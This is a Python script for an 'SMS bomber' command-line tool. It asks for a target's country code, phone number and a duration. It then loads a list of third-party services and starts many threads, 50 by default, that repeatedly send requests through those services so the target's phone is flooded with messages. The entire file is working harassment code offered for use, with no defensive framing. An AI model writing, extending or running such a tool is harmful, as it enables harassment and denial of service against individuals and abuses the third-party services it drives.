#!/usr/bin/python3

import json
import time
import random
import conf.config as cfg
from requests import exceptions
from itertools import cycle
from threading import Thread
from argparse import ArgumentParser
from service import Service


def flood(args, services):
    # Create shuffled services list
    for service_info in cycle(random.sample(services, len(services))):
        if time.time() >= args.time:
            return 
        service = Service(service_info, args.phone, args.timeout)
        domain_name = service.get_domain_name()
        try:
            service.send_request()
            print(f"Success - {domain_name}")
        except exceptions.ReadTimeout:
            print(f"Fail - {domain_name} - ReadTimeout")
        except exceptions.ConnectTimeout:
            print(f"Fail - {domain_name} - ConnectTimeout")
        except exceptions.ConnectionError:
            print(f"Fail - {domain_name} - ConnectionError")
        except Exception as err:
            print(err) 
        except (KeyboardInterrupt, SystemExit):
            exit()


def main():
    # Creating parser obj
    parser = ArgumentParser(
        description="Ultimate sms bomber"
    )
    parser.add_argument("-c", "--country", type=str,
                        metavar="<country-code>",
                        help="country code without (+) sign")
    parser.add_argument("-p", "--phone",
                        metavar="<phone-number>", type=str,
                        help="target's phone number without country code")
    parser.add_argument("-t", "--time",
                        metavar="<sec>", type=float,
                        help="bombing time in seconds")
    parser.add_argument("--threads", default=50,
                        type=int, metavar="<num>",
                        help="bomber's threads count (default: %(default)s)")
    parser.add_argument("-T", "--timeout", default=3,
                        type=float, metavar="<sec>",
                        help="request's timeout, (default: %(default)s)")
    args = parser.parse_args()
    
    # Check args 
    if not args.country:
        if cfg.default_country_code != None:
            args.country = str(cfg.default_country_code)
        else:
            args.country = input("Enter target's country code without + sign: ")
    if not args.phone:
        args.phone = input("Enter target's phone number without country code: ")
    if not args.time:
        args.time = float(input("Enter bombing time in seconds: "))

    # Cleanup country code and phone number
    for trash in ("'", '"', "_", "-", "(", ")", " ", "+"):
        if trash in args.country:
            args.country = args.country.replace(trash, "")
        if trash in args.phone:
            args.phone = args.phone.replace(trash, "")
    
    # Check phone number and country code
    if not 1 <= len(args.country) <= 3:
        exit(f"'{args.country}' country code doesn't exist")
    if len(args.phone) != 10:
        exit(f"'{args.phone}' length is incorrect")

    args.phone = args.country + args.phone 

    # Load services list 
    with open("services.json", "r") as file:
        services = json.load(file)["services"]

    print(cfg.banner)
   
    # Set stop time value
    args.time += time.time()
    
    # Start threads 
    for thread in range(args.threads):
        Thread(target=flood, 
               args=(args, services, )
        ).start()


if __name__ == "__main__":
    main()
